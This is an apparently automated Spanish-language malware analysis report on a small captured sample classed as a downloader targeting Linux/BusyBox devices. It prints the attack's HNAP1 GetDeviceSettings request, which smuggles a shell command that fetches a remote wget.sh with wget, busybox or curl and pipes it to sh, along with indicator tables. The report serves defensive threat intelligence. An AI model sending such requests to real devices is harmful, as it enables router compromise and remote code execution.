# 🧬 Payload Analysis

`c5c6a7ccdf4ea1a5403afea8395b8f1503eb2d539814c4e8eb048898a72df6be`

## 📌 Resumen

Texto ASCII de 560 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `sh -s dhnap2`
2. `busybox wget hxxp://91.92.40.XXX/wget.sh -O-`
3. `curl hxxp://91.92.40.XXX/wget.sh`
4. `wget hxxp://91.92.40.XXX/wget.sh -O-`
5. `busybox wget` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Perfil técnico:** `Linux / BusyBox`, compatible con sistemas embebidos o IoT. BusyBox se trata como indicio de plataforma y no como prueba suficiente de que el dispositivo sea IoT. **Ficha malware:** [malware-like/oraculo/downloader/c5c6a7ccdf4ea1a5403afea8395b8f1503eb2d539814c4e8eb048898a72df6be.md](../../../../../malware-like/oraculo/downloader/c5c6a7ccdf4ea1a5403afea8395b8f1503eb2d539814c4e8eb048898a72df6be.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:42:54.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `c5c6a7ccdf4ea1a5403afea8395b8f1503eb2d539814c4e8eb048898a72df6be`
- **MD5:** `49add17a7bb7b606b28e3d9c37fc0d10`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 560 B |
| Entropía | 5.1 |
| Strings | 4 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=7

## 🖥️ Comandos observados / extraídos

```text
GET /HNAP1/GetDeviceSettings/%60cd%20/tmp%3Bwget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20dhnap2%3Bbusybox%20wget
SOAPAction: "hxxp://purenetworks[.]com/HNAP1/GetDeviceSettings/%60cd%20/tmp%3Bwget%20http://91.92.40.XXX/wget.sh%20-O-%7Cs
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20dhnap2%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20dhnap2%3Bcurl%20http://91.92.40.XXX/wget.sh%7Csh%20-s%20dhnap2%60 | strings |
| url | hxxp://purenetworks[.]com/HNAP1/GetDeviceSettings/%60cd%20/tmp%3Bwget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20dhnap2%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20dhnap2%3Bcurl%20http://91.92.40.XXX/wget.sh%7Csh%20-s%20dhnap2%60 | strings |
| ip | 91.92.40.XXX | static_analysis |
| ip | 190.179.175.XXX | static_analysis |
| command | GET /HNAP1/GetDeviceSettings/%60cd%20/tmp%3Bwget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20dhnap2%3Bbusybox%20wget | strings |
| command | SOAPAction: "hxxp://purenetworks[.]com/HNAP1/GetDeviceSettings/%60cd%20/tmp%3Bwget%20http://91.92.40.XXX/wget.sh%20-O-%7Cs | strings |
| hash | c5c6a7ccdf4ea1a5403afea8395b8f1503eb2d539814c4e8eb048898a72df6be | static_analysis |
| ip | 45.156.87.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
